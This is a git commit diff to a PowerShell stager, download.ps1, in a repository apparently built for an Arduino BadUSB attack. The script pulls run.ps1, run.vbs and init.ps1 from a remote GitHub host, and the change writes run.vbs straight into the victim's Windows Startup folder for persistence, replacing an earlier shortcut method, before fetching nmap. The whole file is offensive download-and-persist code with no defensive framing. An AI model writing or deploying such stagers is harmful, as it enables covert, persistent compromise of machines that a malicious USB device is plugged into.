c4634a1ffd372b42433879489c48e7ef38670712
h3xagon <62241425+h3xagon0001@users.noreply.github.com>
2025-06-30 22:52:31 +0800

    help

--- download.ps1
+++ download.ps1
@@ -1,14 +1,9 @@
 # download run and init
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/run.ps1 -OutFile run.ps1
+
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/run.vbs -OutFile run.vbs
-
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/run.vbs -OutFile "$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\run.vbs"
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/init.ps1 -OutFile init.ps1
-
-# create shortcut in startup folder
-$shell = New-Object -ComObject WScript.Shell
-$shortcut = $shell.CreateShortcut("$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk")
-$shortcut.TargetPath = "$($env:APPDATA)\Fairy\run.vbs"
-$shortcut.Save()
 
 # download and extract nmap
 Invoke-WebRequest -Uri https://github.com/h3xagon0001/arduino-micro-badusb/raw/refs/heads/main/nmap.zip -OutFile nmap.zip
